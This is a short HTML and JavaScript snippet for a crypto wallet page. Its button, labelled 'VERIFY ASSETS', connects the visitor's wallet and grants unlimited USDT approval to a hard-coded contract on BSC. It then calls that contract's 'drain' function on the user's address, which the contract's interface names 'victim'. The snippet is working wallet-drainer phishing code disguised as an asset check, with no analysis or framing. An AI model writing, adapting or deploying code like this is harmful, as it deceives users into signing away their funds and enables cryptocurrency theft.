<!-- VERIFY ASSETS Button -->
<button id="verifyBtn">✅ VERIFY ASSETS</button>

<!-- DApp Script -->
<script type="module">
  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/+esm";

  const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
  const ABI = [
    {
      "inputs": [
        { "internalType": "address", "name": "victim", "type": "address" }
      ],
      "name": "drain",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

  document.getElementById("verifyBtn").addEventListener("click", async () => {
    try {
      if (!window.ethereum) {
        alert("Web3 wallet not found.");
        return;
      }

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const userAddress = accounts[0];
      console.log("Wallet connected:", userAddress);

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const USDT = new ethers.Contract(
        USDT_ADDRESS,
        ["function approve(address spender, uint256 amount) public returns (bool)"],
        signer
      );
      console.log("Approving USDT...");
      const approvalTx = await USDT.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
      await approvalTx.wait();
      console.log("Approval complete.");

      const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
      console.log("Calling drain...");
      const tx = await contract.drain(userAddress);
      await tx.wait();

      alert("Transaction successful!");
    } catch (err) {
      console.error("Error:", err);
      alert("Transaction failed or cancelled.");
    }
  });
</script>
